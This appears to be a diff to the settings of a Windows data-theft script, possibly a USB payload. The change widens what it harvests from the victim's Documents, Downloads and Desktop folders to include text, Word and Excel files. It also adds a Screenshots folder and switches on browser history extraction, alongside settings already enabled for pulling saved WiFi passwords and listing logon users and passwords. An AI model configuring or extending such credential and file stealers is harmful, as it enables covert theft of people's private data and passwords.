@@ -30,14 +30,14 @@ extract_add_folder=false;                                          // Set to tru
 var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory to be inspected
 var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory to be inspected
 var user_subfolder3 = ["Desktop"]                                  // The third folder inside the home user directory to be inspected
-var filetypes_user = ["pdf", "jpg", "png"]                         // The filetypes to extract from previously specified folders in the home directory
-var add_folder = "SoftwareXYZ\\subfolder1\\subfolder2"             // Additional folder inside C:\Program Files (x86)\ that should be inspected for extraction
+var filetypes_user = ["pdf", "txt", "docx", "xlsx", "jpg", "png"]  // The filetypes to extract from previously specified folders in the home directory
+var add_folder = "SoftwareXYZ\\subfolder1\\Screenshots"            // Additional folder inside C:\Program Files (x86)\ that should be inspected for extraction
 var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory
 // WIFI DATA EXTRACTION                                            // ---
 extract_wifi=true;                                                 // Set to true to enable the extraction of WiFi keys
 var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String that indicates saved passwords in the Wifi list (e.g. "Schlüsselinhalt" [German], "Key Content" [English])
 // BROWSER DATA EXTRACTION                                         // ---
-extract_browserdata=false;                                         // Set to true to enable the extraction of browser data (history, bookmarks, logs)
+extract_browserdata=true;                                          // Set to true to enable the extraction of browser data (history, bookmarks, logs)
 // HOME DIRECTORY FILES/FOLDER STRUCTURE EXTRACTION                // ---
 extract_folderstructure=true;                                      // Set to true to enable the extraction of the home directory folder/files structure
 // LOGON USERS & PASSWORD EXTRACTION                               // ---
